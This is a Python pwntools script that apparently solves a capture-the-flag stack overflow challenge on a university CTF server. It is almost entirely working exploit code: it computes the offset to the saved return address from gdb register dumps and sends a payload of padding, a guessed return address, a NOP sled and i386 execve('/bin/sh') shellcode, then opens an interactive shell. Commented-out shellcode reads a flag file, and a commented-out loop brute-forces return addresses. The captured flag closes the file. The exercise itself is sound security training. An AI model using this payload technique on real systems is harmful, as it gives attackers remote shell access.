#!/bin/python3.11
from pwn import *

context.arch = "i386"
context.os = "linux"

#S = process("./bin")
S = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 10006)

#  x/x $ebx-0x232f
# 0x8048cd1:      0x636c6557


# eax            0x0                 0
# ecx            0x0                 0
# edx            0xf7f7d8a0          -134752096
# ebx            0xf7f7be14          -134758892
# esp            0xffffce20          0xffffce20
# ebp            0xffffce28          0xffffce28
# esi            0x8048b90           134515600
# edi            0xf7ffcb60          -134231200
# eip            0x8048aef           0x8048aef <welcome_user+5>
# eflags         0x282               [ SF IF ]
# cs             0x23                35
# ss             0x2b                43
# ds             0x2b                43
# es             0x2b                43
# fs             0x0                 0
# gs             0x63                99

# SAVED REGISTERS
#    0x08048aea <+0>:     push   ebp
#    0x08048aeb <+1>:     mov    ebp,esp
#    0x08048aed <+3>:     push   edi
#    0x08048aee <+4>:     push   ebx
# => 0x08048aef <+5>:     sub    esp,0x100

ebx = 0xf7f7be14
edi = 0xf7ffcb60

ebp = 0xffffce38


username =   0xffffcd60
usernamev2 = 0xffffd2a0
# print("diff is", usernamev2 - username)
eip = 0xffffce6c
offset = eip - username
print(offset)
shellcode = asm(\
    '''
    jmp short shell
start:
    xor eax, eax
    xor edx, edx
    pop ebx
    mov al, 0xb
    xor ecx, ecx
    int 0x80


    mov al, 1
    xor ebx, ebx
    int 0x80

    shell:
        call start
        .string "/bin/sh"
''')
# shellcode = asm(\
#     '''
#     jmp short shell
# start:
#     xor eax, eax
#     xor edx, edx
#     pop ebx
#     mov al, 0x5
#     xor ecx, ecx
#     xor edx, edx
#     int 0x80100

#     xor edx, edx
#     sub esp, 0x40
#     mov ebx, eax
#     mov eax, 3
#     mov ecx, esp
#     mov edx, 0x40
#     int 0x80

#     mov eax, 4
#     mov ebx, 1
#     mov ecx, esp
#     mov edx, 0x40
#     int 0x80

#     mov al, 1
#     xor ebx, ebx
#     int 0x80

#     shell:
#         call start
#         .string "/home/ctf/flag"
# ''')

# for i in range(0, 100):
#     try:
#         # S = process("./bin")
#         S = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 10006)
#         payload = b'A' * offset + p32(eip -2000+ i*100) + b'\x90' * 500 + shellcode
#         print(S.recvuntil(b" your username: "))
#         S.sendline(payload)
#         print(S.recvall())
#         print(f"Attempt {i} succeeded")
#         S.close()
#     except EOFError as e:
#         print(f"Attempt {i} failed: {e}")

payload = b'A' * offset + p32(eip - 100) + b'\x90' * 500 + shellcode
payload = b'A' * offset + p32(eip -2000+ 58*100) + b'\x90' * 500 + shellcode

with open("payload.bin", "wb") as f:
    f.write(payload)


# print(len(shellcode))
# print(len(payload))
print(S.recvuntil(b" your username: "))
S.sendline(payload)
S.interactive()


# STT{CANT_B_MO_CLASSY_THAN_PRIDE_AND_PREJUDICE}